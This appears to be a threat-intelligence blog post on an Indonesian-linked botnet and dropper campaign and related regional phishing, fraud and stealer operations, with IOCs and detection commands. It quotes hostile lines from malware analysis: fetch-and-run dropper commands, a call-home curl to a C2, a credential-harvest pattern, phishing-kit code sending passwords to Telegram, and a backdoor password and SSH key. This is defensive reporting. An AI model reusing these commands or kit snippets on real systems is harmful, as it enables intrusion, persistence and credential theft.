---
title: "In the Wild: Indonesia's Cyber Underground Comes for Your Cloud"
description: "How a mass Next.js exploitation campaign named after the President is quietly backdooring AWS Singapore, DigitalOcean, and anything else it can reach"
pubDate: "2026-07-02T12:00:00"
permalink: "/2026/07/02/sea-underground-2026-govti-v4-tempix-botnet/"
tags: ["govti", "tempix", "indonesia", "botnet", "next.js", "cve-2026-31431", "southeast-asia", "threat-intel"]
---

There is a shell script on VirusTotal disguised as a browser favicon. Its filename is `favico.ico`. Its extension is wrong, its MIME type is wrong, and if your Linux server runs it, within seconds a user named `prabowo` will exist on your box with a sudo-capable password and an SSH key commented `prabowo-gibran` — the names of Indonesia's current President and Vice-President.

This is TEMPIX RCE Collector v5.3. We found it four days ago. It is still running.

---

## The Script

The dropper announces itself in the shebang comment:

```bash
#!/bin/sh
# TEMPIX RCE COLLECTOR v5.3 — Full Telegram Fallback Edition
# wget -qO- http://IP/syu.sh | sh
# curl -fsSL http://IP/syu.sh | sh
```

The rest — roughly 400 lines, written in clear Indonesian — is a complete post-exploitation framework for Linux servers. Not subtle.

**What it does, in order:**

1. **Installs an SSH backdoor key** across every user account it can reach, including root. The key's comment is `prabowo-gibran`. The script checks first — `grep -qF "prabowo-gibran" "$AUTH_KEYS"` — and skips silently if the key is already there. Idempotent. Almost professional.

2. **Creates a local user** named `prabowo` with password `D4pur.Mbg87` and adds it to the `sudo` group. The backdoor user is named after the President. The choice feels deliberate.

3. **Escalates to root** via PwnKit, fetching the binary from `http://193.135.9.84/k` — a Frankfurt server (IP-Projects GmbH, AS48314) with 24 malicious detections on VirusTotal. PwnKit (CVE-2021-4034) is three years old. A staggering number of production servers are still vulnerable.

4. **Scans process memory** for credentials. Every process, every environment variable, via `/proc/*/environ`:
   ```
   SEED_PHRASE|MNEMONIC|WALLET|INFURA|ALCHEMY|JWT_|FIREBASE|
   SUPABASE|CLOUDFLARE|DO_TOKEN|GOOGLE_API
   ```
   Web3 credentials. Cloud API keys. JWT secrets. If your Next.js app has a `.env` file, it's now the operator's `.env` file.

5. **Exfiltrates via Telegram** — four temporary files sent to a hardcoded bot token and chat ID. The Telegram API is the C2. There is no dedicated server to block.

The script auto-detects the Linux distro — `DETEKSI DISTRO` is the Indonesian comment above that section — and adjusts package manager calls accordingly. Someone spent real time on this.

---

## The Operators

Two distinct groups share the same TEMPIX framework but run different Telegram bots:

**"valhala"** — active May 20–21, 2026. Bot: `@tuaek_bot` (token `8933003001`). Focus: Next.js applications, Web3 and crypto projects. Hit `dexponent.com`, `deflationcoin.com`, `bluvo.dev`, `brazaon.com`, `dakar.geoafrica.fr`.

**"holy knight"** — active June 28, 2026. Bot: `@fromyourholesaku_bot` (token `8226891849`). Broader sweep: WordPress, Apache, anything exposed.

Both exfiltrate to the same Telegram infrastructure. Both use the `prabowo-gibran` SSH key. Both are Indonesian — the script language, operator slang, and political naming leave little doubt.

The bot name `@fromyourholesaku_bot` contains *aku* — the Indonesian first-person pronoun. "Tuaek" is Indonesian slang, a rough phonetic of *tua ekstra*: elderly, old-school, used as mild disparagement. These aren't aliases chosen with operational security in mind.

---

## What They Stole

From the `@tuaek_bot` "valhala" group, the bot's history is a live feed of a dev team's worst day:

**`dakar.geoafrica.fr`** — Next.js container running as root inside Docker. Environment variables exfiltrated:
```
OPENROUTER_API_KEY=sk-or-v1-[REDACTED]
DATABASE_URL=postgresql://postgres:[REDACTED]@geoafrica.fr:5436/livrata?schema=public
```

**`49.13.137.75`** — P2P crypto market platform, running as root:
```
DATABASE_URL=postgresql://[REDACTED]@postgres:5432/decoyp2pmarket?schema=public
```
Stack includes `wagmi ^3.6.1` — the React Web3 library. Crypto application, weak database credentials.

**`http://www.hiiot.io`** — AWS Singapore (`HOSTNAME=ip-172-32-0-110.ap-southeast-1.compute.internal`). The container leaked its ECS credentials relay URI:
```
AWS_CONTAINER_CREDENTIALS_RELATIVE_URI=/v2/credentials/[REDACTED]
```
This URI — only reachable from inside the container — hands over temporary AWS IAM credentials from `169.254.170.2`. The attacker got it from `/proc`. Whatever S3 buckets, DynamoDB tables, or Lambda functions the task role can reach, they can reach too.

---

## The June 28 Campaign

The "holy knight" group's single session on June 28, 2026 produced over 40 victim notifications in a few hours:

| Host | IP | Cloud | Organisation |
|---|---|---|---|
| `ip-172-16-9-96` | — | AWS ap-southeast-1 | Unknown — `nextjs` user shell |
| `ip-172-26-4-20` | `3.0.67.11` | AWS ap-southeast-1 | `demo-retail-v1.grhadigital.id` — Grha Digital 🇮🇩 ERP — **Root + PwnKit** |
| `ip-172-32-0-110` | — | AWS ap-southeast-1 | `hiiot.io` ECS — **Root + ECS IAM credentials exposed** |
| `bim-sgp1-01` | `157.245.149.81` | DigitalOcean SGP | `3hmotosport.com` — Indonesian 🇮🇩 motorbike e-commerce |
| `thequikpawn` | `128.199.142.123` | DigitalOcean SGP | `thequikpawn.com` — Thai 🇹🇭 pawnshop |
| `ssp-dev-new` | `128.199.101.163` | DigitalOcean SGP | `admin-dev.sspv2.ecomobi.com` — Ecomobi Vietnam 🇻🇳 adtech SSP |
| `ubuntu-4gb-fsn1-1` | `167.233.133.253` | Hetzner | PwnKit success, `prabowo` created |
| `os3-388-27267` | `133.167.117.21` | Akamai/Linode Tokyo | Hit |
| `chinese-conversion-deployment-*` | `47.244.197.209` | Alibaba Cloud HK (K8s) | daemon user |
| `laconic.co.th` | — | Various | Thai company, root confirmed |

The organisations using Singapore cloud infrastructure — 3H Motosport, QuikPawn, Ecomobi, Grha Digital — are Indonesian, Thai, Vietnamese, and Indonesian companies. They use Singapore as a cloud region. This isn't targeting Singapore businesses; it's targeting Southeast Asian businesses whose infrastructure happens to sit in Singapore datacentres. AWS ap-southeast-1 shows up three times. If you run a Next.js app in Singapore's cloud, you were in scope.

The consistent targeting of Next.js apps running as root inside Docker points to **CVE-2025-29927** — Next.js middleware auth bypass — or a closely related server-side path that allows reading `process.env` from outside the container. The timing (May–June 2026) aligns with public exploit availability for that family.

---

## GOVTI v4: The Platform Behind the Backdoors

The SSH key and the root shell aren't the objective. They're the delivery mechanism.

After TEMPIX installs the `prabowo` user and drops the `prabowo-gibran` key, it fetches a second payload to `/usr/local/bin/.apt-task` — an ELF binary disguised as a legitimate APT service task. UPX-compressed, anti-debug, Go-compiled. 29 security vendors detect it. ESET calls it `Linux/DDoS.Agent.JI`. Kaspersky calls it `Alien`. Sophos calls it `Linux/DDoS-GJ`. It's an agent for **GOVTI v4** — a cross-platform botnet framework that, until this week, had no public coverage anywhere.

```mermaid
flowchart LR
    A["Next.js RCE\nCVE-2025-29927"] --> B["TEMPIX syu.sh\n400-line dropper"]
    B --> C["prabowo user\nprabowo-gibran key\ncred harvest → Telegram"]
    B --> D["PwnKit\nCVE-2021-4034\nroot"]
    D --> E["GOVTI Agent\n.apt-task / .libsystemd.so"]
    E --> F["DDoS botnet\nGitHub dead drop C2"]
    E --> G["ntsvc bridge\nLayer 2 VPN"]
    G --> H["Operator\nFull LAN access"]

    style A fill:#b91c1c,color:#fff
    style D fill:#b91c1c,color:#fff
    style G fill:#1d4ed8,color:#fff
    style H fill:#15803d,color:#fff
```

### The Dead Drop

The agent's first action on any newly infected machine isn't a direct call to a C2. It calls GitHub:

```
https://gist.githubusercontent.com/lueiromelina797-art/4c354be94b4617e14f2808625c85edfc/raw/gistfile1.txt
```

The gist returns one JSON object:

```json
{"c2": "119.59.116.120", "magic": "govti_v4"}
```

The operator created `lueiromelina797-art` on March 29, 2026 — a throwaway account for a throwaway file. If the C2 IP needs to change, they update one line. No recompilation, no redeployment — the entire botnet pivots. That gist has been updated four times. The live C2 at `119.59.116.120` is in Thailand (Bang Len), running nginx with a page titled "Internal Service Portal". Shodan confirms it was active June 28, 2026 — the same day as the "holy knight" victim notifications.

### The Agent

Strings from the macOS ARM64 GOVTI agent (SHA: `c60ad26439ffce79808749b500c35f3a2e71bc3057156c7161964c3f13a24330`) reveal the full capability set:

- **DDoS**: SYN flood, UDP flood, HTTP flood
- **Exploit scanner**: `grafana_path_traversal`, `exchange_proxyshellrouter` (ProxyShell)
- **Credential harvester**: scans `/var/www/.env`, `/opt/app/.env`
- **Intranet scanner**: `172.16.0.0/12`, WordPress login at `/wp-login.php`
- **Spread**: `[+] Spread initiated (background)`
- **C2 protocol**: `ASC2_v3_PreSharedKey_ChangeMe!`

That last string is the entire security model for GOVTI C2 communications. AES-GCM encrypted, pre-shared key — never rotated, same in every build. Anyone with a packet capture of GOVTI traffic and this key can decrypt every command and every response. The self-identification string in every agent: `# Auto-generated by GOVTI Agent`. The magic field: `govti_v4`. Fourth iteration. The developer version-tracks.

A Lua scripting engine (`github.com/yuin/gopher-lua`) is embedded in the binary, enabling modular exploit loading without recompiling. The operator can push new exploits as Lua scripts to already-running bots.

### The Network Tunnelling Framework

Alongside the DDoS botnet, the operator deploys `ntsvc` — a separate Go tool that isn't a botnet at all.

`ntsvc` is a custom Layer 2 VPN tunnelling framework. The help text embedded in every binary:

```
ntsvc attach      - Attacker VPN client (TAP)
ntsvc bridge      - Bridge agent (TAP mode, needs CAP_NET_ADMIN)
ntsvc bridge-low  - Bridge agent (raw socket, needs CAP_NET_RAW)
ntsvc hub         - Run hub server on VPS (multi-client + web admin)
```

```mermaid
flowchart TB
    OP["Operator\nmacOS ARM64\nntsvc attach"]
    HUB["ntsvc Hub\n124.220.51.88\nTencent Cloud Shenzhen\nports 80 · 443 · 1194 · 4500"]
    V1["Victim A\nntsvc bridge\nTAP interface"]
    V2["Victim B\nntsvc bridge-low\nraw socket"]
    V3["IoT / Router\nntsvc bridge\nOpenWrt / ARM"]
    L1["Internal DB\nnot internet-facing"]
    L2["Intranet services\n172.16.0.0/12"]
    L3["LAN devices\nARP-reachable"]

    OP <-->|"TLS :8443"| HUB
    HUB <-->|"TAP tunnel"| V1
    HUB <-->|"raw tunnel"| V2
    HUB <-->|"TAP tunnel"| V3
    V1 --- L1
    V2 --- L2
    V3 --- L3

    style HUB fill:#1e40af,color:#fff
    style OP fill:#15803d,color:#fff
    style V1 fill:#7f1d1d,color:#fff
    style V2 fill:#7f1d1d,color:#fff
    style V3 fill:#7f1d1d,color:#fff
```

A hub server runs on the operator's VPS. Compromised victims run `ntsvc bridge` — creating a TAP interface that tunnels their entire network segment to the hub. The operator runs `ntsvc attach` and connects through. They get full Layer 2 access: ARP-scan the victim's LAN, hit internal services that aren't internet-facing, impersonate the victim's IP. This isn't a SOCKS proxy. It's a network bridge.

Source file paths preserved in the binary — `ntsvc/bridge.go`, `ntsvc/hub.go`, `ntsvc/cmdsrv.go`, `ntsvc/shell_linux.go`, `ntsvc/rawsock_linux.go`, `ntsvc/download.go` — confirm this is a substantial custom codebase. The hub maintains `ntsvc.state.json` tracking all connected bridges. Each victim's OS, hostname, IP addresses, and username are sent on connection: `[bridge] system: %s/%s host=%s ips=%s user=%s`.

Windows GOVTI variants (`v25-agent-win64.exe` through `v27-agent-win64.exe`, first seen May 17–18, 2026) add Npcap for packet capture and ConPTY for interactive `cmd.exe`. Five builds submitted to VirusTotal on a single day. The operator was iterating.

### The Stage-2 Dropper

The GOVTI deployment flow doesn't end with TEMPIX. After initial compromise, the operator delivers a Stage-2 dropper — a 3,028-byte shell script titled `# Stage-2 Agent Deployer (Universal: Linux + IoT/BusyBox/OpenWrt)`.

Not written for cloud servers. Written for **everything**:

```sh
A=$(uname -m 2>/dev/null)
case $A in x86_64|amd64)A=amd64;;aarch64|arm64)A=arm64;;armv*)A=arm;;
mips64)A=mips64;;mipsel|mips32el)A=mipsle;;mips*)A=mips;;i?86)A=386;;esac
```

MIPS, MIPSEL, ARMv7 — router and IoT architectures. OpenWrt, BusyBox, SysVinit are all explicitly handled. The operator isn't just targeting cloud workloads; they're sweeping home routers, embedded devices, and anything running Linux on any CPU.

The dropper installs a second SSH backdoor key — different from the `prabowo-gibran` key used by TEMPIX:

```
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIM+TH9+cWA9PDRZ9c76KWXhmw3/yYHlX0i6KeQUdZmrT svc
```

Comment: `svc`. Two separate backdoors on every compromised machine.

It downloads the `.libsystemd.so` agent from the Thai C2 at ports 80, 443, and 8899 — tries every possible method (curl, wget, BusyBox wget, Python 3, Python 2). Then calls home:

```sh
curl -s "http://119.59.116.120:80/deploy_ack?arch=$A&s=dl" >/dev/null 2>&1 &
```

The operator gets a real-time ping for every successful download (`s=dl`) and every successful execution (`s=ex`). They know who's infected before the bot makes its first C2 check-in.

Four persistence mechanisms run simultaneously: cron (every 5 minutes), `rc.local` (SysVinit), `init.d/sysmond` (OpenWrt), `systemd sysmond.service` (modern Linux). The binary copies itself to three separate hidden locations to survive manual cleanup.

### CVE-2026-31431

The `.libsystemd.so` agent carries an embedded exploit: **CVE-2026-31431**, a Linux kernel local privilege escalation through the `algif_aead` cryptographic interface — a Dirty Pipe-style page cache write via AF_ALG socket plus `splice()`.

Kaspersky labels it `HEUR:Exploit.Linux.CVE-2026-31431.c`. ESET: `Linux/Exploit.CVE-2026-31431.A`. Fortinet: `Linux/CVE_2026_31431.A!exploit`. The PoC was attributed to Theori/Xint Code Research (Taeyang Lee) and weaponized by a researcher named Zor0ark — earliest submission on VirusTotal: June 27, 2026. The operator embedded it directly in the botnet agent. No longer relying on PwnKit for every victim. Any unpatched Linux kernel goes straight to root automatically.

The CVE also shows up in `bingo-ai` — addressed in the next section.

### The C2 Migration Chain

The dead drop gist was updated three times after creation, each update rotating the botnet's C2 IP:

```mermaid
timeline
    title GOVTI C2 Migration — March to July 2026
    section Testing
        Mar 21 : GoatCounter first hits : Campaign begins
        Mar 29 : Gist created : C2 = 103.79.79.21 (Gwy It SG)
    section Rotation
        Apr 22 : First burn : C2 = 185.238.249.5 / whhlc.com.cn
        Apr 25 : Second hop : C2 = 103.79.79.243 (Gwy It SG)
        Apr 26 : Current : C2 = 119.59.116.120 (Thailand)
    section Escalation
        May 17 : Windows agents v25-v27 submitted to VT
        Jun 28 : holy knight campaign — 40+ victims
        Jul 1 : PPTV banker deployed
```

When the C2 migrates, bots cut off from GitHub receive the new address via the `updater` script — a shell script pushed to still-reachable machines that kills the running agent and restarts from the new download URL. Three separate fallback mechanisms — dead drop, Kademlia DHT (`154.26.129.99:6881`), updater push — the botnet survives any single infrastructure takedown.

`185.238.249.5` is registered to Gwy It but resolves to `whhlc.com.cn` — a Chinese `.com.cn` domain using Alibaba/HiChina DNS. The operator parked on a compromised Chinese company server for one week.

### The Infrastructure

| Host | Location | Role |
|---|---|---|
| `119.59.116.120` | Thailand (Bang Len) | Live C2 — nginx "Internal Service Portal", active June 28 |
| `103.79.79.21` | Singapore (Gwy It) | Download server — ports 8899/16881 |
| `103.79.79.243` | Singapore (Gwy It) | Former C2, April 25 (48 hours) |
| `185.238.249.5` / `whhlc.com.cn` | Gwy It US | Former C2, April 22 — compromised Chinese company |
| `124.220.51.88` | Tencent Cloud, Shenzhen | ntsvc hub — ports 80/443/1194/4500, tagged `vpn` |
| `154.26.129.99` | Singapore (Contabo) | Backend — 105+ services, DHT port 6881 |
| `193.135.9.84` | Frankfurt (IP-Projects) | PwnKit server — 24 VT malicious dets |

VT submissions tracking `103.79.79.21` begin **April 18, 2026** — a month before the active TEMPIX campaign. The operator was running infected machines and testing infrastructure through all of April before escalating.

### The PPTV Campaign

On July 1, 2026, five new Windows executables appeared on VirusTotal with 42–46 detections under the name `pptvsetup${_WEBSITEADDTION}_s.exe`.

PPTV is a Chinese streaming platform. The `${_WEBSITEADDTION}` — misspelled, missing the second 'I' — is an unsubstituted template variable from the build system. The PE version resource claims the publisher is "PPLive Corporation" (PPTV's legitimate parent). The Comments field holds a campaign tag: `forqd707`. Packed with ASProtect.

Kaspersky detects it as `Trojan-Banker.Win32.BestaFera.gen`. Drop paths in sandbox analysis: `C:\Windows\system32\spool\DRIVERS\W32X86\3\<random>\<random>.exe` — Windows print spooler persistence, deeply nested random-name directories. The same naming pattern as the v25–v27 Windows GOVTI agents.

The operator running President-named Linux backdoors against Southeast Asian cloud infra is also running a Chinese-language banker trojan against users of a Chinese streaming platform. The target intersection is unusual. The infrastructure fingerprints are not coincidental.

### bingo-ai: GitHub Reputation Poisoning

CVE-2026-31431 also appears in `bingo-ai` (`github.com/bingook/bingo`) — a tool that claims to be an "AI-powered red team terminal" with contributions from 20+ elite security researchers: George Hotz, Tavis Ormandy (Project Zero), Natalie Silvanovich (Project Zero), James Forshaw (Project Zero), Mateusz Jurczyk (Project Zero), Michal Zalewski (lcamtuf), HD Moore (Metasploit creator), Filippo Valsorda (Go security), halvarflake, thegrugq, bunnie Huang, dinodaizovi, Thomas Ptacek, Adam Langley, Travis Goodspeed.

None of them contributed. Every one of those "contributions" is a fabricated git commit.

The technique: git commit authorship is set client-side. The developer configured author emails to match these researchers' GitHub noreply addresses (`username@users.noreply.github.com` — the old unauthenticated format). GitHub associates these commits with the real accounts. The faked commits were surrounded by genuine CI/CD bot integrations — Snyk, SonarCloud, Codecov, Devin AI, GitHub Copilot, Amazon Q, Renovate, Dependabot — so the contributor graph looks like a professionally maintained open source project with industry endorsement.

The real author is `bingook`, a GitHub account created June 11, 2026 with 2 followers. Their local machine git config leaked in two commits: author name `jmaker`, same `bingook` noreply email. Account `jmaker` dates to August 2013 — a frontend web developer whose only two repos are a CoffeeScript Sass utility library and a Sublime Text theme collection. A decade later, the same person.

The commit history tells you what the tool actually is:

| Date | Message |
|------|---------|
| 2026-07-01 | `feat: v3.5.21 — 全面APT化 (AI phishing / supply-chain / lateral movement)` |
| 2026-07-01 | `feat: v3.5.20 — 0day Hunter v2: 5 real-world exploit modules integrated` |
| 2026-07-01 | `feat: v3.5.19 — 0day Hunter (auto detect/exploit/CVE-map)` |

"全面APT化" — Full APT-ization. Not *simulate* an APT. Not *detect* APT techniques. *Become* one. The tool automates phishing, supply chain compromise, lateral movement, and zero-day exploitation using AI models (DeepSeek, Claude, GPT, GLM) to guide each step. It has 188 versions on PyPI, development predating the public GitHub by months. The developer commits in Korean and Chinese.

Whether the GOVTI operator built `bingo-ai`, uses it, or merely shares CVE knowledge with its developer isn't established by passive analysis. Same attack date (July 1), same CVE, same language pattern. The capabilities match the GOVTI operator's documented TTPs precisely.

### Operator Profile

From passive analysis only:

- **Timezone**: UTC+7 (WIB — Western Indonesia Standard Time)
- **Dev machine**: macOS ARM64, source at `/Volumes/2T/govti/agent_src/`
- **Ops machine**: Windows, tools at `D:\auto_black_abuse\resources\unzipped\`
- **Code language**: Simplified Chinese (comments, GoatCounter: Asia/Shanghai)
- **Campaign start**: March 21, 2026 (GoatCounter first hits)
- **GitHub**: `lueiromelina797-art` — throwaway, created March 29, 2026
- **Scale**: 40+ victims in a single June 28 session; Grha Digital (ID), Ecomobi (VN), 3H Motosport (ID), QuikPawn (TH) all confirmed

The `auto_black_abuse` directory — the exploitation toolkit on their Windows machine — isn't a name chosen by someone worried about exposure.

---

## Parallel Operation: The IBOYSMARTIFY Phishing Kit

While TEMPIX goes after servers, a separate operation went after the people who work at them.

A 109KB HTML file presents itself as a PDF viewer titled "Document.pdf". Click any button and it shows a login form. Enter your credentials and:

```javascript
const botToken = '8720305068:[REDACTED]';
const chatId = '8551003759';
const message = `IBOYSMARTIFY PDF Login\nUsername: ${username}\nPassword: ${password}\nIP: ${ip}`;
```

The bot — `@tentrdt_bot` — was live. We dumped 300 messages across two chats: the operator's personal chat and a group called **"26 Hustler"**.

The kit runs four phishing templates simultaneously: IBOYSMARTIFY PDF Login, General Webmail ReZulT (with city-level GeoIP lookup), ZEUS_365 (Microsoft 365 harvester), and PAYMENT INVOICE LOgs. Vietnamese corporate accounts dominated the victim list:

- `[victim]@hcarbon.com` — H Carbon, Dong Nai province — captured twice
- `[victim]@dongtaycorp.vn` — Ho Chi Minh City — captured four times in five minutes (redirect loop)
- `[victim]@hbcg.vn` — HBCG Vietnam, HCMC
- `[victim]@algieskomputindo.com` — PT Algies Komputindo, Indonesia
- `[victim]@bnh.co.th` — BNH Group, Thailand

The "Checker" field in every notification — `email:password`, pre-formatted for credential stuffing tools — means credentials go straight into a checker the moment the notification lands. The kit also validates MX records on every harvested address; only real corporate mail servers generate an alert. Junk addresses filter themselves out.

---

## The Vietnamese Click-Fraud Economy

Beneath the phishing kits and the RCE tooling sits the labour force that makes it all click-through.

`@scamvuotlink_bot` (token `8245097248`) runs a structured gig platform for 112 enrolled workers. Tasks pay in "xu" (Vietnamese for "cent"):

- Click short links (via linktot.net) — 3 xu/click
- Fake Google Maps reviews — per submission
- App installs — higher payout
- Keyword search-and-click — SEO manipulation

Cash out requires 5,000 xu minimum, paid to Vietnamese bank accounts. The operator, `@buian09` , holds accounts at Vietcombank (`[REDACTED]`) and VPBank (`[REDACTED]`). The same operator runs `@cutokhonglo_bot` — a gambling referral bot for `ric79.vin`. Two revenue streams, one operator.

Admin commands in the leaked message history:

```
/cxu 7648703245 100000
```

`/cxu` adds xu to a user ID. That ID is the operator's own Telegram account. The operator topping up his own balance with his own bot's admin command.

---

## The Malaysian AiTM Campaign

Operator handle `@Ewako90` ran a classic adversary-in-the-middle campaign against Malaysian J&T Express customers in early June 2026. The phishing page served a three-stage flow — registration, OTP relay, password capture — designed to pass credentials through the real J&T login before the victim notices anything is wrong.

25 real Malaysians in 25.5 hours across June 3–4, 2026. Victim names redacted; dump included residents from Sarawak (identified by Dayak naming conventions).

Bot: `@Dalle677_BOT` (token `8704023429`).

---

## The Indonesian PyPI Package

While automated tools compromised servers and phishing kits harvested credentials, someone quietly pushed a Python package to PyPI.

`norsodikin` (versions 0.8.0 and 0.8.1) contains `nsdev/addUser.py` — a class `SSHUserManager` whose `add_user()` method silently creates a backdoor user on any Linux system that imports the package. Error messages in Bahasa Indonesia:

```
Pengguna sudah ada. Silakan pilih nama pengguna yang berbeda.
```
("User already exists. Please choose a different username.")

New installs report to `@NorSodikin` on Telegram. The broader package includes Indonesian payment gateway integrations — Midtrans, Tripay, VioletMedia — marketed as a legitimate developer tool with a hidden cost. There is also a `gemini.py` module with a "khodam" personality preset. Khodam are spiritual entities in Indonesian and Javanese belief. Whether this is cultural flavour or an in-joke is unclear. The SSH backdoor is not.

---

## The CocCoc Stealer

CocCoc is Vietnam's dominant local browser — Chromium-based, tuned for Vietnamese users, ~7% desktop market share. A 124KB compiled Python file (17 VT detections) specifically targets `C:\Program Files\CocCoc\Browser\Application\browser.exe` alongside Chrome and Chromium. The attacker knows their target demographic.

One confirmed exfiltration: **74 passwords** and **4,464 cookie rows** from a Viettel Vietnam IP in Cao Lãnh, Đồng Tháp province. The C2 is `103.149.252.249`, reverse-resolving to `grafana.innvie.vn` — registered to AI-Solutions Company Limited in Cao Lãnh, Đồng Tháp. The victim's IP is also Đồng Tháp. The attacker and victim are in the same province. Vietnam is a small country, even online.

Operator: `@peterkar08` .

---

## The Phishing Domain Cluster

From a 258,780-entry phishing blocklist, the SEA-specific entries map the regional targeting surface:

**Vietnam:** `mbbank247.top/.cyou/.bar/.rest` (MB Bank rotation), `vietcombank.ddns.net`, `vietcom-credit.com`

**Indonesia:** `aktifkan-dana-paylater-pt-espay-new-yx.resmi-v1.my.id` ("resmi" = official — a classic Indonesian phishing tell), `nesia-qris1d.cfd` (QRIS national payment standard), `sesekali-gasak.pages.dev` ("grab something once in a while", Cloudflare Pages), `undangangroup18-indonesia.ntdll.top` (wedding invitation phishing — "undangan" = invitation — abusing a Windows DLL name as a TLD)

**Malaysia:** `clickacimb.top`, `cimbbank.info` (CIMB Bank)

**Thailand:** `kasikorn-thb.com` (KasikornBank)

The blocklist contains an embedded Telegram bot token — someone assembled it by scraping phishing kit source code. Possibly a competing threat actor mining credentials from their rivals' kits, possibly a researcher. The ecosystem eats itself.

---

## IOC Summary

**TEMPIX RCE Collector v5.3**
- Bot tokens: `8933003001` (valhala), `8226891849` (holy knight)
- C2/PwnKit server: `193.135.9.84` (IP-Projects GmbH, AS48314) — 24 VT dets, confirmed live July 1, 2026
- SSH backdoor key comment: `prabowo-gibran`
- Backdoor user: `prabowo`, password `D4pur.Mbg87`
- SHA: `22d30cf7238704569864e016ff5d4fe72d737485320ea423c8e7453605e6a9f2` (syu.sh, 13 dets)
- Confirmed victims: `hiiot.io` (AWS ap-southeast-1), `3hmotosport.com` 🇮🇩, `thequikpawn.com` 🇹🇭, `ecomobi.com` 🇻🇳, `grhadigital.id` 🇮🇩, `laconic.co.th` 🇹🇭

**GOVTI v4 Botnet**
- Dead drop gist: `lueiromelina797-art/4c354be94b4617e14f2808625c85edfc` (secret, updated 4×)
- Live C2: `119.59.116.120` (Thailand, Bang Len)
- C2 chain: `103.79.79.21` → `185.238.249.5`/`whhlc.com.cn` → `103.79.79.243` → current
- Download server: `103.79.79.21` — ports 8899/16881
- ntsvc hub: `124.220.51.88` (Tencent Cloud Shenzhen) — ports 80/443/1194/4500
- Backend/DHT: `154.26.129.99` (Contabo Singapore)
- C2 panel: `in7game.org` (Cloudflare) — `ws0`–`ws9`, `acc`, `res`, `oss`, `share`
- Agent check-in: `https://share.in7game.org/share/agent/AD0FZE5G`
- GoatCounter: `govtiv4.goatcounter.com` (Asia/Shanghai, first hits March 21, 2026)
- Pre-shared key (never rotated): `ASC2_v3_PreSharedKey_ChangeMe!`
- SSH backdoor key (GOVTI): `ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIM+TH9+cWA9PDRZ9c76KWXhmw3/yYHlX0i6KeQUdZmrT svc`
- Linux DDoS agent: `809183527979aa0cc29509ad76c8d0071a44c2b8bfd980a48f47f59faeca78a2` (29 dets)
- Linux LPE agent (.libsystemd.so): `17b23e526e7333236a4badfd34e143439f5cc08dadef9c62447252d0bd5d07fe` (3 dets, CVE-2026-31431)
- Stage-2 dropper: `8fb2ea63c1924f5933315ae91073acc17fc6fbb1b4063cb644b0536fc89b8e27` (2 dets)
- macOS ARM64 agent: `c60ad26439ffce79808749b500c35f3a2e71bc3057156c7161964c3f13a24330`
- Windows agent v27: `a7e3996724bbe988df5f6c2824207d9e79cd90cbbd83c32e569d76d86315f09e` (2 dets)
- ntsvc Linux: `bd3da91c2051335011009987acd74bc93d2a12cbb2a5c59bd839c9bf8429b113`
- PPTV banker: `52b5ffeb04f86fda93c06f55277c350b7fb3ab229247f5c73fae3ad558e30e03` (46 dets, tag: `forqd707`)

**IBOYSMARTIFY Phishing Kit**
- Bot: `@tentrdt_bot`, token `8720305068`, chat `8551003759`

**Vietnamese Click-Fraud**
- Bot: `@scamvuotlink_bot`, token `8245097248`
- Operator: `@buian09`  — Vietcombank `[REDACTED]`, VPBank `[REDACTED]`

**Malaysian AiTM**
- Bot: `@Dalle677_BOT`, token `8704023429`, operator `@Ewako90`

**Indonesian PyPI Supply Chain**
- Package: `norsodikin` v0.8.0–0.8.1, bot token `7419614345`, chat `1964437366`

**CocCoc Stealer**
- SHA: `098f854036a793f72b259b592e23d8cfbdda725b9fe93fd7357de371da212416` (17 dets)
- Operator: `@peterkar08`, C2: `103.149.252.249` (grafana.innvie.vn)

---

## What To Do

**If you run Next.js in production:** Patch CVE-2025-29927 and its derivatives. ECS containers in AWS ap-southeast-1 with overly-permissive task roles are particularly exposed — a single middleware bypass leaks the entire process environment, including IAM temporary credentials. Scope your ECS task roles aggressively.

**Check for TEMPIX now:**
```bash
grep -r "prabowo-gibran" ~/.ssh/ /root/.ssh/ /home/*/.ssh/ 2>/dev/null
grep "^prabowo:" /etc/passwd
ls -la /usr/local/bin/.apt-task /usr/local/bin/.svc 2>/dev/null
```
Any hit means you're compromised. The campaign was running four days ago.

**For corporate email in Vietnam and Indonesia:** The "General Webmail ReZulT" + city-level GeoIP is a fingerprint for the IBOYSMARTIFY kit family. Any PDF or invoice lure asking for webmail credentials, hosted on a domain under 90 days old, is a phish until proven otherwise.

**For PyPI security:** `norsodikin` is removed. If it or any successor in that namespace reappears, pull it immediately. If you've run it, rotate SSH credentials on every Linux host in your developer environment.

**For Linux kernel CVE-2026-31431:** The GOVTI `.libsystemd.so` agent achieves automatic root escalation on unpatched kernels via AF_ALG + splice(). Check your kernel version against the patched releases.

---

None of this stopped while you were reading. The Telegram bots are still up. The `prabowo-gibran` SSH key is still being installed. The GOVTI C2 at `119.59.116.120` was live four days ago. The `pptvsetup` fake PPTV installer launched yesterday and is still at 42–46 detections — most endpoint platforms haven't caught up. The 112 workers in `@scamvuotlink_bot` are still clicking links.

Southeast Asian cybercrime is historically underreported. The tools are less sophisticated than what comes out of Russia or China, the actors are noisier, the infrastructure more carelessly exposed. That makes them easier to hunt. It doesn't make them less dangerous to the businesses, banks, and cloud accounts they're targeting — many of which are in the same region, and many of which have no idea this ecosystem exists.

The GOVTI operator is worth watching. A cross-platform botnet with dead-drop C2 resilience, a custom Layer 2 VPN tunnelling framework, Lua-extensible exploit loading, Kademlia DHT peer-to-peer fallback, a 2026 Linux kernel LPE, and a Windows credential-stealing campaign launched against Chinese streaming users in parallel — this isn't a script kiddie running TEMPIX for fun. Someone spent months building this. The `auto_black_abuse` toolkit is still on their `D:\` drive, and the next campaign is probably already being zipped and uploaded.

---

*Research conducted passively: VirusTotal content search, Shodan passive scanning, Telegram bot dump of publicly accessible history, binary strings analysis of samples already on VirusTotal, GitHub API, OSINT. No live C2 contact. No credentials tested or used. Victim email addresses and personal data appearing in bot dumps are not reproduced here. Attribution statements reflect passive analysis only and should be treated as working hypotheses pending law-enforcement confirmation.*
